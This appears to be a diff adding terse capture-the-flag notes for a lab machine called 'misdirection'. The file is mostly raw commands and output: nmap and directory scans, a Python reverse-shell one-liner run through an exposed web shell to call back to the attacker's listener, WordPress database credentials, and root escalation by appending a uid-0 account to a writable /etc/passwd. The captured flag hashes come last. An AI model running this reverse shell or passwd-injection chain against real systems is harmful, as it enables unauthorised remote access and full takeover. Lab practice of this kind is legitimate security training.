@@ -1,0 +1,99 @@
+└─$ nmap -A -p 22,80,3306,8080 192.168.178.137
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 23:02 PDT
+Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 96.88% done; ETC: 23:03 (0:00:01 remaining)
+Nmap scan report for 192.168.178.137
+Host is up (0.00079s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
+|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
+|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
+80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
+|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+3306/tcp open  mysql   MySQL (unauthorized)
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 00:0C:29:66:05:43 (VMware)
+
+[23:03:25] 301 -  323B  - /css  ->  http://192.168.178.137:8080/css/
+[23:03:25] 301 -  325B  - /debug  ->  http://192.168.178.137:8080/debug/
+[23:03:25] 200 -    3KB - /debug/
+[23:03:25] 200 -  414B  - /development/
+[23:03:28] 301 -  324B  - /help  ->  http://192.168.178.137:8080/help/
+[23:03:28] 200 -  409B  - /help/
+[23:03:28] 301 -  326B  - /images  ->  http://192.168.178.137:8080/images/
+[23:03:28] 200 -  409B  - /images/
+[23:03:29] 200 -  408B  - /js/
+[23:03:30] 301 -  326B  - /manual  ->  http://192.168.178.137:8080/manual/
+[23:03:35] 301 -  327B  - /scripts  ->  http://192.168.178.137:8080/scripts/
+[23:03:35] 200 -  408B  - /scripts/
+[23:03:36] 403 -  305B  - /server-status
+[23:03:36] 403 -  306B  - /server-status/
+[23:03:36] 301 -  325B  - /shell  ->  http://192.168.178.137:8080/shell/
+[23:03:36] 200 -  410B  - /shell/
+[23:03:42] 200 -    1KB - /wordpress/wp-login.php
+[23:03:42] 200 -    4KB - /wordpress/
+
+
+//under /shell page,it is web shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.129",8821));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wp_myblog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'abcdefghijklmnopqrstuv' );
+//but mysql is forbidden to login
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.178.129] from (UNKNOWN) [192.168.178.137] 49256
+/bin/sh: 0: can't access tty; job control turned off
+$ sudo -i -u brexit /bin/bash
+id
+uid=1000(brexit) gid=1000(brexit) groups=1000(brexit),24(cdrom),30(dip),46(plugdev),108(lxd)
+python -c 'import pty; pty.spawn("/bin/bash")'
+brexit@misdirection:~$ cd ~
+cd ~
+brexit@misdirection:~$ ls
+ls
+start-vote.sh  user.txt  web2py
+brexit@misdirection:~$ cat user.txt
+cat user.txt
+404b9193154be7fbbc56d7534cb26339
+
+brexit@misdirection:~/web2py$ ls -la /etc/passwd
+ls -la /etc/passwd
+-rwxrwxr-- 1 root brexit 1617 Jun  1  2019 /etc/passwd
+brexit@misdirection:~/web2py$ echo "new:\$1\$new\$.Nm5wgdVZR7.gAjnHaRK40:0:0::/root/bin/bash" >> /etc/passwd
+<VZR7.gAjnHaRK40:0:0::/root/bin/bash" >> /etc/passwd
+brexit@misdirection:~/web2py$ cat /etc/passwd | grep bash
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+brexit:x:1000:1000:brexit:/home/brexit:/bin/bash
+new:$1$new$.Nm5wgdVZR7.gAjnHaRK40:0:0::/root/bin/bash
+brexit@misdirection:~/web2py$ su new
+su new
+Password: 111222
+
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+cd /root
+# ls
+ls
+root.txt
+# cat root.txt
+cat root.txt
+0d2c6222bfdd3701e0fa12a9a9dc9c8c
